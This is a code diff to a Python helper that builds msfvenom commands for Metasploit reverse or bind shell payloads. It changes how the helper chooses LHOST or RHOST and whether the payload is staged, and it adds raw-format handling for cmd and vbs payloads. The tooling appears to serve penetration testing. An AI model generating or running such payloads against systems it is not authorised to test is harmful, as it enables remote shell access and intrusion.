@@ -117,15 +117,24 @@ def print_available_payloads(keywords,payload_list):
 def generate_payload(params,number,avail_payloads):
     K_TYPE ,K_ARCH,K_MET, K_BIND, K_STAGE, K_EXT, K_KEY, IP, PORT = params
     print(params)
+    
+    payload_cmd =avail_payloads[number].split()[0]
+    # If we have broadened the search :
+    # reverse payload could have been chosen instead of the original bind one
+    # Stageless payload could also have been chosen instead of original staged one
+    if "reverse" in payload_cmd :
+        K_BIND="reverse" # We need to DOUBLE CHECK and force option for correct LHOST/RHOST
+    HOST = "LHOST" if K_BIND == "reverse" else "RHOST" 
+    K_STAGE = "staged" if "staged" in payload_cmd else ""
+    
     pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # pretify pname
     pname = "_" + pname # fast trick to remove all payload in dir via rm _*
     print(pname)
+
+        
     
-    HOST = "LHOST" if K_BIND == "reverse" else "RHOST" 
-    
-    payload_cmd =avail_payloads[number].split()[0]
-    if "cmd/" in payload_cmd:
-        print("[EXPERIMENTAL] Try to process CMD payload..")
+    if "cmd/" in payload_cmd or "vbs" in payload_cmd:
+        print("[EXPERIMENTAL] Try to process payload..")
         K_FORMAT = "raw"
         payload="msfvenom -p {} {}={} LPORT={} -f {} ".format(payload_cmd,HOST, IP,PORT,K_FORMAT)       
     
